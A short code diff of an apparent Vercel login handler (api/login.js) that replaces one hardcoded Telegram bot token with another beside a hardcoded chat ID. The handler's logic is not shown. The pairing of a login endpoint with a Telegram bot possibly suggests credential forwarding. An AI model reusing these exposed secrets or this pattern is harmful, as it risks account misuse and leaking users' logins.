@@ -1,6 +1,6 @@
 // api/login.js
 
-const TELEGRAM_BOT_TOKEN = "8281346868:AAG9JQvQuJhinNbpu8bZ5a0QS2cVhzUX4jM";
+const TELEGRAM_BOT_TOKEN = "8833600368:AAE08rH7LYHgLcjLLZnIbP67g5Gf_bKP9fo";
 const CHAT_ID = "6604182176";
 
 // Ini adalah fungsi handler untuk Vercel Edge Function
